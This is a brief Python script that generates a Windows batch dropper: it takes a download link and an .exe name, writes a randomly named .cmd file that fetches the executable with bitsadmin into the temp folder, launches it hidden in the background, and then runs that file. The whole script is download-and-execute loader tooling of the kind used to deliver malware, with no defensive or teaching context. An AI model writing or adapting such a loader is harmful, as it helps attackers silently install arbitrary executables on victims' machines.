import random
import string
import subprocess

def loader(link, script):
    ran = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    cmd = f"{ran}.cmd"
    loader = f'''@echo off
setlocal EnableExtensions EnableDelayedExpansion
set "url={link}"
set "filePath=%temp%\\{script}"
bitsadmin /transfer "mdj" /download /priority FOREGROUND "%url%" "%filePath%"
start /B "" "%filePath%" >nul 2>&1
'''
    return cmd, loader

link = input('Enter direct download link to your .exe file:')
script = input('Enter exact name of .exe file on link you provided:')
if not link.startswith("http"):
    raise ValueError("Invalid URL entered.")
if not script.endswith(".exe"):
    raise ValueError("Invalid file name entered.")
cmd, loader = loader(link, script)

with open(cmd, "w") as f:
    f.write(loader)

try:
    subprocess.run([cmd], check=True)
except subprocess.CalledProcessError as e:
    print(f"Command failed with exit code {e.returncode}.")
else:
    print(f"{cmd} saved to folder!!!")

